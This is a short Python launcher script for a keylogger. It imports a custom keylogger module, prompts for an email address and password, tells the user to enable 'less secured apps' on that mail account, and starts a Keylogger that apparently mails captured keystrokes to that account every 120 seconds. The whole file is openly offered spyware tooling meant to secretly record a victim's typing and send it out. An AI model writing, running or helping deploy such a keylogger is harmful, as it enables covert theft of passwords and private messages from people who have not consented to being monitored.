import keylogger

email = input("email on which you want to recieve info\t:\t")
print("\n please enable --less secured apps-- on mail account to recieve emails \n")
password = input("password :\t")
my_keylogger = keylogger.Keylogger(120, email, password)
my_keylogger.start()
